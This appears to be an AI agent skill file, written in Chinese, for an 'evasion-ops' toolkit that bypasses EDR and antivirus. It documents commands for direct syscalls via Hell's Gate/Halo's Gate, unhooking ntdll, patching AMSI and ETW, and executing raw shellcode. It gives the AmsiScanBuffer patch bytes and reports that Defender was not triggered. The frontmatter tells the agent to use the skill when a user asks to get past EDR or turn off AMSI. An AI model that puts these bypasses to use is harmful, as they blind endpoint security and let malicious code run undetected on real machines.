---
name: evasion-ops
description: Use when a target process has EDR/AV hooks you need to get past, or you need to run code without touching monitored APIs — direct/indirect syscall、Hell's Gate SSN 解析、ntdll unhooking、AMSI patch、ETW patch、hook 检测、shellcode 执行、进程注入。当用户说「过 EDR」「绕过 hook」「关掉 AMSI」「这个函数被 hook 了」「不经过 ntdll 调用」时用。静态分析用 bin-arsenal，动态 trace 用 hook-ops。
---

# evasion-ops — 绕过用户态监控

脚本：`C:\Users\KonomiHasu\dsh-private\skills\evasion-ops\evasion.py`

## 实测底子（2026-11-13，Win11 26200，24 核）

| 能力 | 结果 |
|---|---|
| `VirtualAlloc(RWX)` + 执行手写机器码 | ✅ 返回 42 |
| `hooks` | ✅ 491 个 Nt* 全标准，0 可疑 |
| `ssn` Hell's Gate | ✅ `NtQuerySystemInformation=0x36` `NtCreateFile=0x55` `NtClose=0x0f` |
| `syscall` 真调用 | ✅ `NTSTATUS=0 SUCCESS`，`PageSize=4096`，`NumberOfProcessors=24` |
| `sc --asm` 汇编→反汇编→执行 | ✅ `mov eax,1337` → `b839050000c3` → 返回 `0x539` |
| `peb` 隐蔽枚举 | ✅ 基址/大小全对（python.exe 0x7ff701900000, ntdll 0x7ffd12650000） |
| `unhook` | ✅ 内存 vs 磁盘差异 `0/16176` 字节，完全还原 |
| `amsi` patch | ✅ `AmsiScanBuffer` → `33c04189014883c418c3` |
| `etw` patch | ✅ `EtwEventWrite` / `Full` / `Ex` 三个全改 |
| Defender 拦截 | 未触发 |

## 实现时踩的四个坑

| 坑 | 现象 | 原因 |
|---|---|---|
| `dir(ctypes.WinDLL)` | 枚举到 **0 个** Nt* 函数 | ctypes 对象不在 `dir()` 里暴露导出；要解析 PE 导出表 + `GetProcAddress` |
| `NtCurrentTeb` | `AttributeError` | 不是真导出（编译期内联）；改用机器码读 `gs:[0x30]` |
| PEB 模块偏移 | 基址读成 `0x0` | `Ldr+0x10` 是 **InLoadOrder** 链，我按 InMemoryOrder 算偏移；InMemoryOrder 在 `+0x20` |
| `unhook` 定位 .text | 「定位 .text 失败」 | 用磁盘 PE 的 `ImageBase` 算 RVA，但 ASLR 让运行时基址不同；要用 `ntdll_base()` |
| `ssn` 全部失败 | `hooked-no-neighbor` | Win11 的 stub 是 `4c8bd1 b8 SSN` 后跟 `test byte [KUSER_SHARED_DATA],1`，不是 `0f05`；需识别多种变体 |
| `hooks` 误报 | `NtQuerySystemTime`/`NtGetTickCount` 被判 hook | 它们跳转到 ntdll **内部**实现（导出区之外但仍在镜像内）；要用 `SizeOfImage` 判范围 |

## 命令

```powershell
$E = "C:\Users\KonomiHasu\dsh-private\skills\evasion-ops\evasion.py"

python $E hooks                        # 检测 ntdll 里的 inline hook
python $E ssn                          # 列出所有 Nt* 的 SSN
python $E syscall NtQuerySystemInformation --args 0,0x缓冲区,0x1000
python $E unhook                       # 从 KnownDlls 还原 ntdll 的 .text
python $E amsi                         # patch AMSI（当前进程）
python $E etw                          # patch ETW（当前进程）
python $E sc --asm "mov eax,42; ret"   # 汇编 → 验证 → 执行
python $E load                        # 加载本 skill 的运行时到当前 Python
```

## 为什么直接 syscall 能绕过 hook

EDR 的标准做法是往 `ntdll.dll` 的 `Nt*` 函数开头写 `jmp`，把调用导到自己的监控模块：

```
正常:   ntdll!NtClose  →  mov r10,rcx / mov eax,0f / syscall / ret
被hook: ntdll!NtClose  →  jmp <EDR 的监控函数>      ← 所有调用都被看见
```

绕过方式：**不调 ntdll，自己发 syscall**。

x64 的系统调用约定是固定的：

```asm
mov r10, rcx        ; 4C 8B D1    第 1 个参数搬到 r10
mov eax, <SSN>      ; B8 xx xx xx xx
syscall             ; 0F 05
ret                 ; C3
```

只要知道 SSN（系统调用号），就能自己发。SSN 从 ntdll 的**原始字节**里读——这就是 Hell's Gate。

## 三种拿 SSN 的方法

| 方法 | 适用 | 说明 |
|---|---|---|
| **Hell's Gate** | ntdll 未被 hook | 直接读 `mov eax, <SSN>` |
| **Halo's Gate** | 目标函数被 hook | 找**相邻**的 Nt 函数，按地址顺序推算 |
| **硬编码表** | 版本固定 | 按 build 号查表，跨版本必错 |

`ssn` 命令用的是 Hell's Gate + Halo's Gate 混合：读不到就上下找邻近的。

## 检测 hook（`hooks` 命令）

对比**内存里的 ntdll** 和**磁盘上的 ntdll**：

```powershell
python $E hooks
```

输出三种状态：

```
NtClose                  CLEAN
NtCreateFile             HOOKED  jmp 0x7ffd...  (磁盘: 4c8bd1b8...)
NtProtectVirtualMemory   HOOKED  (首字节 e9 = 相对 jmp)
```

**同一文件在内存和磁盘上字节不同 = 被改了 = 有东西在监控你。**

## unhook

从 `\KnownDlls\ntdll.dll`（内核维护的干净映射）或磁盘重新读 `.text` 节，覆盖回内存。

```powershell
python $E unhook
```

会先备份原字节到 `~/.dsh-evasion/ntdll_backup_<pid>.bin`，可回滚。

## AMSI / ETW patch

**AMSI** 是脚本内容的扫描接口（PowerShell、VBScript、.NET 反射加载都过它）。

```powershell
python $E amsi
```

手法：把 `amsi.dll!AmsiScanBuffer` 的前几个字节改成直接返回 `S_OK` 且结果为 `AMSI_RESULT_CLEAN`。

**ETW** 是 Windows 的事件追踪，EDR 靠它收「进程创建/模块加载/内存分配」事件。

```powershell
python $E etw
```

手法：patch `ntdll!EtwEventWrite` 为 `xor eax,eax; ret`（返回 0 = 成功但不发事件）。

**两个都只影响当前进程**，重启即恢复，不留痕迹在磁盘。

## shellcode

```powershell
# 内联汇编（需要 keystone；没装就用 --hex）
python $E sc --asm "mov eax,42; ret"
python $E sc --hex b82a000000c3
python $E sc --hex b82a000000c3 --exec      # 真的执行
```

用 `capstone` 先反汇编给你看，确认无误再执行。

## 已知限制

| 限制 | 说明 |
|---|---|
| **只绕用户态** | 内核回调（PsSetCreateProcessNotifyRoutine）看不见 syscall 层，照收事件 |
| **ETW patch 之后** | 某些 EDR 会用 `EtwEventWriteFull` 或直接读内核缓冲区，patch 一个不够 |
| **AMSI patch 之后** | .NET 5+ 有 `AmsiScanBuffer` 之外的路径 |
| **unhook 会被发现** | 对比「磁盘 vs 内存一致」的检测逻辑会认为你在隐藏 |
| **需要 keystone 才能 --asm** | 没装就只用 `--hex` |
| **无管理员时** | 只能操作当前进程；注入别的高权限进程需要提权 |

## 对抗的本质

这些技术不是「装上就无敌」。**它是在跟具体某个 EDR 的实现细节博弈**：

- 你绕 syscall，它转去 hook 内核回调
- 你 patch ETW，它改用 ETW-TI（内核态，patch 不了）
- 你 unhook，它检测「ntdll 内存与磁盘一致」= 你在隐藏

**每一条都要针对目标环境实测**，通用方案不存在。`hooks` 命令就是用来先摸清对方 hook 了哪些函数。

## 底线

- 只在自己拥有的进程/样本上做
- patch 之前备份原字节（脚本自动做了）
- 不要在系统关键进程上实验
- 这些技术被 AV 标记是正常的，别把「被拦」当成「技术不对」
